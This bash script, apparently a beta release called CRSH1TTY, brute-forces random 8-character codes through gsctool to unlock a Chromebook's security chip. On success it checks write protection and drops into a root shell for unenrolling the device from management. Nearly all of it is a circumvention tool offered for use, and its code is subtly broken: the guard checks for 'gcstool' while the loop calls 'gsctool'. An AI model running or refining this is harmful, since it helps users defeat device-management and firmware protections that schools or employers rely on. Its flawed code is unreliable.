#!/bin/bash
# CRSH1TTY BUILD 1 / BETA #1

# patch notes:
# - none, check back next build (few days / hours)

force=true # why did i name it this lmfaooo
print_codes=true
instances=1

main() {
  while $force; do 
    generate_code
    if [ "$fast" != "2" ]; then
      clear
      echo "CRSH1TTY Public Beta #1 - build 1" # just gonna list this as build 1, all subsequent releases will be built off of this haha
      echo "
        @@@@        
    @@@@@@@@@@@@    
   @@@@@@@@@@@@@@   
  @ @@@@            
 @@@ @  @@@@  @@@@@ 
 @@@@  @@@@@@ @@@@@ 
 @@@@@  @@@@  @@@@@ 
  @@@@@@     @@@@@  
   @@@@@@@@ @@@@@   
    @@@@@@ @@@@@    
        @ @@        
        "
    fi
    if [ "$print_codes" == true ]; then
        echo "Trying the code $ac"
    else
        ((count++))
        if [ "$count" -eq 10000 ]; then
            count=0
            echo "Generated 10000 codes, please check progress."
        fi
    fi
    sudo gsctool -t -r "$ac"
    if [ $? -eq 0 ]; then
      force=false
      echo "FOUND IT! Correct code is $ac"
      sleep 1
      read -p "Write down your auth code or take a picture and press enter to continue"
      sleep 2
      echo "Let's check if write protection is actually off"
      sleep 3
      crossystem wpsw_cur # more convenient than flashrom, I swear!!!
      sleep 3
      echo "DM @crossystem about this on Discord and send her the picture."
      sleep 2
      echo "Opening a bash shell for unenrolling..."
      sleep 1
      sudo bash
      break
    fi
  done
}

if command -v gcstool &> /dev/null; then

if grep -q "warning: script from noexec mount" "$0"; then
    echo "ignore that warning ^"
fi

echo "|--------------------------|"
read -p "| Do you want to clear the console each time it tries a code? (y/n): | " answer && { [ "$answer" == "y" ] && fast=1 || fast=2; }
echo "|--------------------------|"
read -p "| Do you want to print codes to console? (y/n): | " answer && { [ "$answer" == "y" ] && print_codes=true || print_codes=false; }
echo "|--------------------------|"
read -p "| Enter the number of instances to run (minimum 1): | " user_instances
if [[ "$user_instances" =~ ^[0-9]+$ && "$user_instances" -ge 1 ]]; then
    instances=$user_instances
fi
echo "|--------------------------|"

generate_code() {
  characters="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
  ac=""

  for ((j=0; j<8; j++)); do
    ac+=${characters:$((RANDOM%36)):1}
  done
}

for ((i=0; i<$instances; i++)); do
    main &
done

wait
else
    echo "gcstool is not available. Exiting..."
    exit 1
fi
